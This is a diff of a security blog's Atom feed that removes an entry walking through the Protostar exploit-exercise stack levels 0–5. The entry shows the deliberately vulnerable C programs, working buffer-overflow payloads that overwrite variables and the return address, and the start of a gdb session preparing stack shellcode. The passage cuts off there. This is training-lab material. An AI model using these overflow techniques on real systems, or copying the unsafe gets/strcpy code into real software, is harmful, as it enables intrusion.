@@ -4,7 +4,7 @@
   <title><![CDATA[0x73696e65]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-06-26T18:40:41+02:00</updated>
+  <updated>2015-06-26T19:02:28+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,674 +12,6 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
-  
-  <entry>
-    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Stack Levels)]]></title>
-    <link href="http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels/"/>
-    <updated>2015-06-27T09:46:35+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Stack0</h2>
-
-<figure class='code'><figcaption><span>stack0.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "\xfa" * 64' | ./stack0 
-</span><span class='line'>Try again?
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "\xfa" * 64 + "\x01"' | ./stack0 
-</span><span class='line'>you have changed the 'modified' variable</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Stack1</h2>
-
-<figure class='code'><figcaption><span>stack1.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64')
-</span><span class='line'>Try again, you got 0x00000000
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64 + [0x41414141].pack("V") ')
-</span><span class='line'>Try again, you got 0x41414141
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64 + [0x61626364].pack("V") ')
-</span><span class='line'>you have correctly got the variable to the right value</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Stack2</h2>
-
-<figure class='code'><figcaption><span>stack2.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack2 
-</span><span class='line'>stack2: please set the GREENIE environment variable
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e 'print "A" * 64 + [0x41414141].pack("V")') ./stack2 
-</span><span class='line'>Try again, you got 0x41414141
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e 'print "A" * 64 + [0x0d0a0d0a].pack("V")') ./stack2 
-</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Stack3</h2>
-
-<figure class='code'><figcaption><span>stack3.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
-</span><span class='line'>      <span class="n">fp</span><span class="p">();</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We need to rewrite fp function address with the address of win().</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "X" * 64 + [0x41414141].pack("V")' | ./stack3 
-</span><span class='line'>calling function pointer, jumping to 0x41414141
-</span><span class='line'>Segmentation fault
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ nm ./stack3 | grep win
-</span><span class='line'>08048424 T win
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "X" * 64 + [0x08048424].pack("V")' | ./stack3 
-</span><span class='line'>calling function pointer, jumping to 0x08048424
-</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Stack4</h2>
-
-<figure class='code'><figcaption><span>stack4.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We use metasploit patterns (on Kali Linux) to determine the exact location of stored EIP:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># Window 1:
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 80
-</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
-</span><span class='line'>
-</span><span class='line'># Window 2:
-</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./stack4 
-</span><span class='line'>Reading symbols from /opt/protostar/bin/stack4...done.
-</span><span class='line'>
-</span><span class='line'>(gdb) r
-</span><span class='line'>Starting program: /opt/protostar/bin/stack4 
-</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x63413563 in ?? ()
-</span><span class='line'>
-</span><span class='line'># Window 1:
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
-</span><span class='line'>[*] Exact match at offset 76
-</span><span class='line'>
-</span><span class='line'># Window 2:
-</span><span class='line'>user@protostar:/opt/protostar/bin$ nm stack4 | grep win
-</span><span class='line'>080483f4 T win
-</span><span class='line'>
-</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "A" * 76 + [0x080483f4].pack("V")' | ./stack4 
-</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Stack5</h2>
-
-<figure class='code'><figcaption><span>stack5.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The idea is the same as in Stack4, but we need to store shellcode on stack, for example.</p>
-
-<p>Stack is executable:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ readelf -a ./stack4 | grep GNU_STACK
-</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To have the same address in bash and gdb, we use hellman&rsquo;s fixenv tool.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ git clone https://github.com/hellman/fixenv
-</span><span class='line'>Cloning into fixenv...
-</span><span class='line'>remote: Counting objects: 20, done.
-</span><span class='line'>Unpacking objects: 100% (20/20), done.
-</span><span class='line'>remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 20
-</span><span class='line'>
-</span><span class='line'>user@protostar:~$ cd fixenv/
-</span><span class='line'>
-</span><span class='line'>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack5 
-</span><span class='line'>GNU gdb (GDB) 7.0.1-debian
-</span><span class='line'>Copyright (C) 2009 Free Software Foundation, Inc.
-</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html>
-</span><span class='line'>This is free software: you are free to change and redistribute it.
-</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-</span><span class='line'>and "show warranty" for details.
-</span><span class='line'>This GDB was configured as "i486-linux-gnu".
-</span><span class='line'>For bug reporting instructions, please see:
-</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/>...
-</span><span class='line'>Reading symbols from /home/user/fixenv/.launcher...done.
-</span><span class='line'>
-</span><span class='line'>(gdb) set disassembly-flavor intel
-</span><span class='line'>
-</span><span class='line'>(gdb) disassemble main 
-</span><span class='line'>Dump of assembler code for function main:
-</span><span class='line'>0x080483c4 &lt;main+0>:   push   ebp
-</span><span class='line'>0x080483c5 &lt;main+1>:   mov    ebp,esp
-</span><span class='line'>0x080483c7 &lt;main+3>:   and    esp,0xfffffff0
-</span><span class='line'>0x080483ca &lt;main+6>:   sub    esp,0x50
-</span><span class='line'>0x080483cd &lt;main+9>:   lea    eax,[esp+0x10]
-</span><span class='line'>0x080483d1 &lt;main+13>:  mov    DWORD PTR [esp],eax
-</span><span class='line'>0x080483d4 &lt;main+16>:  call   0x80482e8 &lt;gets@plt>
-</span><span class='line'>0x080483d9 &lt;main+21>:  leave  
-</span><span class='line'>0x080483da &lt;main+22>:  ret    
-</span><span class='line'>End of assembler dump.
-</span><span class='line'>
-</span><span class='line'>(gdb) b *0x080483d4
-</span><span class='line'>Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
-</span><span class='line'>
-</span><span class='line'>(gdb) b *0x080483d9
-</span><span class='line'>Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.
-</span><span class='line'>
-</span><span class='line'>(gdb) r
-</span><span class='line'>Starting program: /home/user/fixenv/.launcher 
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff914) at stack5/stack5.c:10
-</span><span class='line'>10    stack5/stack5.c: No such file or directory.
-</span><span class='line'>  in stack5/stack5.c
-</span><span class='line'>
-</span><span class='line'>(gdb) x /xw $esp
-</span><span class='line'>0xbffff810:   0xbffff820
-</span><span class='line'>
-</span><span class='line'>(gdb) c
-</span><span class='line'>Continuing.
-</span><span class='line'>ABCDEFGH
-</span><span class='line'>
-</span><span class='line'>Breakpoint 2, main (argc=1, argv=0xbffff914) at stack5/stack5.c:11
-</span><span class='line'>11    in stack5/stack5.c
-</span><span class='line'>(gdb) x /s 0xbffff820
-</span><span class='line'>0xbffff820:    "ABCDEFGH"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The address <code>0xbffff820</code> represents the buffer[] address, we store our
-shellcode here and jump to this address. Also we know, that return address is
-overwritten after position 76, from Protostar Stack4. We created our shellcode
-<a href="http://localhost:4000/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">here</a>.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
